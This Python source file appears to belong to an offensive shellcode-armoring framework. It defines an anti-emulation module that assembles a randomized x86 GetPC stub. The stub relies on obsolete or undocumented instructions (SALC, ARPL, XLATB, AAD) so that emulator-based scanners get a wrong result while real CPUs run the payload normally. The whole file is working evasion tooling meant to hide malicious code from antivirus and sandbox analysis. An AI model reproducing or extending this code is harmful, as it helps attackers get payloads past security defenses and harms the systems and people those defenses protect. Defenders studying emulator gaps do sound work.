#!/usr/bin/python

"""
obsolete instruction"-based "Faithfulness gap" anti-emulation armor
Anti-emulation armor integrating unsupported "obsolete" instructions
"""

from random import choice
from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module
from arch.core import stackpointer_registers, word_keywords, arch_registers, acc_regs, ctr_regs, data_regs, base_regs, src_index_regs, dest_index_regs

class evasion_faith_obsol(evasion_module):

	def getpc_stub(self, getpc_reg):
		reg_size = 2**self.bits

		stackpointer_reg = stackpointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]

		acc_reg = acc_regs[self.bits]
		acc_reg_08_low = acc_regs[(8 | 0)]
		acc_reg_16 = acc_regs[16]

		ctr_reg = ctr_regs[self.bits]
		base_reg = base_regs[self.bits]

		dst_index_reg = dest_index_regs[self.bits]
		src_index_reg = src_index_regs[self.bits]

		regs = arch_registers(self.arch, self.bits)
		reg2 = regs.random_gp_reg(False, [acc_reg, src_index_reg, dst_index_reg])

		getpc_reg_16 = regs.gp_reg_to_size(getpc_reg, self.bits, 16)
		
		# This effectively limits reg3 to the data_reg since it can't be acc, ctr, base, dst_index or src_index
		reg3 = data_regs[self.bits]

		reg3_08_low = data_regs[(8|0)]
		reg3_16 = data_regs[16]

		# null instruction
		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		# Raw instructions MIASM assembler couldn't handle
		arpl_instruction = "\t.byte 0x63\n\t.byte 0x{:02x}\n".format((0xC0 + regs.gp_reg_to_index(reg3) + (8 * regs.gp_reg_to_index(getpc_reg))))
		xlatb_instruction = "\t.byte 0xD7\n"

		variables = {'xlatb_instruction': xlatb_instruction, 'arpl_instruction': arpl_instruction, 'getpc_reg_16': getpc_reg_16, 'acc_reg': acc_reg, 'acc_reg_08_low': acc_reg_08_low, 'acc_reg_16': acc_reg_16, 'ctr_reg': ctr_reg, 'base_reg': base_reg, 'null_instr': null_instr, 'reg2': reg2, 'reg3': reg3, 'reg3_08_low': reg3_08_low, 'reg3_16': reg3_16, 'word_keyword': word_keyword, 'stackpointer_reg': stackpointer_reg, 'getpc_reg': getpc_reg, 'reg_size': reg_size}

		listing = '''
main:
	JMP docall
callback:
	{null_instr} {acc_reg}, {acc_reg}
	.byte 0xF9 ; STC
	.byte 0xD6 ; SALC
	TEST {acc_reg}, {acc_reg}
	JZ docall ; should never be taken because of SALC

	XOR {acc_reg_08_low}, 0xFF
	MOV {getpc_reg}, {acc_reg}
	XCHG {getpc_reg}, {reg2}
	MOV {getpc_reg}, 0x208FFFF
	XOR {getpc_reg}, 0x301FFFF
	BSWAP {getpc_reg}
	AAD 2
	XCHG {getpc_reg}, {reg3}
	INC {acc_reg}

	{arpl_instruction}

	JZ docall ; should never be taken
	
	{null_instr} {reg3_16}, {reg3_16}
	ADD {reg3}, {stackpointer_reg}
	MOV {base_reg}, {reg3}
	
	{null_instr} {reg3}, {reg3}
	{null_instr} {ctr_reg}, {ctr_reg}
	SUB {ctr_reg}, (-4 % {reg_size})

xlat_loop:
	{null_instr} {acc_reg}, {acc_reg}

	{xlatb_instruction}

	SHL {reg3}, 8
	MOV {reg3_08_low}, {acc_reg_08_low}
	INC {base_reg}
	LOOP xlat_loop

	BSWAP {reg3}
	MOV {getpc_reg}, {reg3}
	RET

docall:
	CALL callback
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub